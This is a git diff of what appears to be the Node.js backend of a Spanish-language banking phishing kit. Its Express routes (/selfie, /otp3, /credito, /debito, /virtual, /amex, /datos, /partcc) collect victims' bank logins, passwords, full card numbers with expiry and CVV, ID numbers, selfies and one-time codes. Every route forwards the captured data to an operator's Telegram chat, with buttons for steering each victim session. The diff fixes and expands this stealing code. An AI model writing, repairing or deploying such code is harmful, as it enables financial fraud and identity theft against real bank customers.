@@ -4,7 +4,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const cors = require('cors');
-const multer = require('multer');
+const FormData = require('form-data'); // ✅ Paquete correcto para Node.js
 const app = express();
 
 const corsOptions = {
@@ -132,16 +132,18 @@ app.post('/selfie', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar foto a Telegram
+    // ✅ Usar form-data correctamente para Node.js
     const formData = new FormData();
-    const blob = new Blob([buffer], { type: 'image/jpeg' });
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, fileName || 'selfie.jpg');
+    formData.append('photo', buffer, {
+      filename: fileName || 'selfie.jpg',
+      contentType: 'image/jpeg'
+    });
     formData.append('caption', caption);
     formData.append('reply_markup', JSON.stringify(getPrimaryReplyMarkup(sessionId)));
 
     await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
-      headers: { 'Content-Type': 'multipart/form-data' }
+      headers: formData.getHeaders()
     });
 
     res.send({ ok: true });
@@ -238,18 +240,19 @@ app.post('/otp2', async (req, res) => {
   }
 });
 
-app.post('/visa', async (req, res) => {
+app.post('/otp3', async (req, res) => {
   try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const { sessionId, user, pass, dina, ip, country, city } = req.body;
     const mensaje = `
-💳 VISA
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
+🔴 Ingreso OTP 3
+👤 User: ${user}
+🔑 Pass: ${pass}
+🔢 Dina: ${dina}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion3');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -257,23 +260,26 @@ app.post('/visa', async (req, res) => {
     });
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /visa:', error.message);
+    console.error('Error en /otp3:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
-app.post('/master', async (req, res) => {
+app.post('/credito', async (req, res) => {
   try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const { sessionId, user, pass, credito, vencimiento, cvv, ip, country, city } = req.body;
     const mensaje = `
-💳 MASTERCARD
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
+💳 Tarjeta de CRÉDITO
+👤 User: ${user}
+🔑 Pass: ${pass}
+💳 Número: ${credito}
+📅 Vencimiento: ${vencimiento}
+🔐 CVV: ${cvv}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -281,23 +287,26 @@ app.post('/master', async (req, res) => {
     });
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /master:', error.message);
+    console.error('Error en /credito:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
-app.post('/debit', async (req, res) => {
+app.post('/debito', async (req, res) => {
   try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const { sessionId, user, pass, debito, vencimiento, cvv, ip, country, city } = req.body;
     const mensaje = `
-🏦 DÉBITO
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
+💳 Tarjeta de DÉBITO
+👤 User: ${user}
+🔑 Pass: ${pass}
+💳 Número: ${debito}
+📅 Vencimiento: ${vencimiento}
+🔐 CVV: ${cvv}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -305,23 +314,26 @@ app.post('/debit', async (req, res) => {
     });
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /debit:', error.message);
+    console.error('Error en /debito:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
-app.post('/credit', async (req, res) => {
+app.post('/virtual', async (req, res) => {
   try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const { sessionId, user, pass, virtual, vencimiento, cvv, ip, country, city } = req.body;
     const mensaje = `
-💰 CRÉDITO
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc || "N/A"}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
+💳 Tarjeta VIRTUAL
+👤 User: ${user}
+🔑 Pass: ${pass}
+💳 Número: ${virtual}
+📅 Vencimiento: ${vencimiento}
+🔐 CVV: ${cvv}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -329,22 +341,26 @@ app.post('/credit', async (req, res) => {
     });
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /credit:', error.message);
+    console.error('Error en /virtual:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
 app.post('/amex', async (req, res) => {
   try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const { sessionId, user, pass, amex, vencimiento, cvv, ip, country, city } = req.body;
     const mensaje = `
-💎 AMEX
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc}
-🌐 ${ip} - ${city}, ${country}
+💳 Tarjeta AMEX
+👤 User: ${user}
+🔑 Pass: ${pass}
+💳 Número: ${amex}
+📅 Vencimiento: ${vencimiento}
+🔐 CVV: ${cvv}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -359,16 +375,20 @@ app.post('/amex', async (req, res) => {
 
 app.post('/datos', async (req, res) => {
   try {
-    const { sessionId, dc, num, mail, ip, country, city } = req.body;
+    const { sessionId, user, pass, nombre, cedula, correo, telefono, ip, country, city } = req.body;
     const mensaje = `
 📋 DATOS PERSONALES
-🆔 Documento: ${dc}
-📱 Celular: ${num}
-📧 Correo: ${mail}
-🌐 ${ip} - ${city}, ${country}
-🧩 sessionId: ${sessionId}
+👤 User: ${user}
+🔑 Pass: ${pass}
+📛 Nombre: ${nombre}
+🪪 Cédula: ${cedula}
+📧 Correo: ${correo}
+📱 Teléfono: ${telefono}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -376,40 +396,24 @@ app.post('/datos', async (req, res) => {
     });
     res.send({ ok: true });
   } catch (error) {
-    console.error('❌ Error en /datos:', error.message);
+    console.error('Error en /datos:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
 app.post('/partcc', async (req, res) => {
   try {
-    const { sessionId, user, pass, tarjeta, mFecha, aFecha, cvv, cardType, ip, country, city } = req.body;
-    
-    let cardTypeEmoji = '💳';
-    let cardTypeName = 'TARJETA';
-    if (cardType === 'visa') {
-      cardTypeEmoji = '💳';
-      cardTypeName = 'VISA';
-    } else if (cardType === 'mastercard') {
-      cardTypeEmoji = '💳';
-      cardTypeName = 'MASTERCARD';
-    } else if (cardType === 'amex') {
-      cardTypeEmoji = '💎';
-      cardTypeName = 'AMEX';
-    }
-    
+    const { sessionId, user, pass, partcc, ip, country, city } = req.body;
     const mensaje = `
-${cardTypeEmoji} ${cardTypeName} - DATOS COMPLETOS
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-💳 Tarjeta: ${tarjeta}
-📅 Vencimiento: ${mFecha}/${aFecha}
-🔢 CVV: ${cvv}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
+💳 16 DÍGITOS TC/DB
+👤 User: ${user}
+🔑 Pass: ${pass}
+💳 16 Dígitos: ${partcc}
+🌐 IP: ${ip} - ${city}, ${country}
+🆔 sessionId: ${sessionId}
     `.trim();
-    
-    const reply_markup = getPrimaryReplyMarkup(sessionId);
+    redirections.set(sessionId, null);
+    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -420,27 +424,6 @@ ${cardTypeEmoji} ${cardTypeName} - DATOS COMPLETOS
     console.error('Error en /partcc:', error.message);
     res.status(500).send({ ok: false });
   }
-});
-
-// =========================
-// RUTAS SECUNDARIAS
-// =========================
-
-app.post('/visaoro', async (req, res) => {
-  try {
-    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
-    const mensaje = `
-💳 VISA ORO
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
-🔢 CVC: ${cvc || "N/A"}
-🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
-    `.trim();
-    const reply_markup = getSecondaryReplyMarkup(sessionId);
-    await axios.post(getTelegramApiUrl('sendMessage'), { chat_id: CHAT_ID, text: mensaje, reply_markup });
-    res.send({ ok: true });
-  } catch (error) { console.error('Error en /visaoro:', error.message); res.status(500).send({ ok: false }); }
 });
 
 app.post('/visaclasica', async (req, res) => {
@@ -684,5 +667,4 @@ setInterval(async () => {
   } catch (error) {
     console.error("❌ Error en auto-ping:", error.message);
   }
-
 }, 180000);
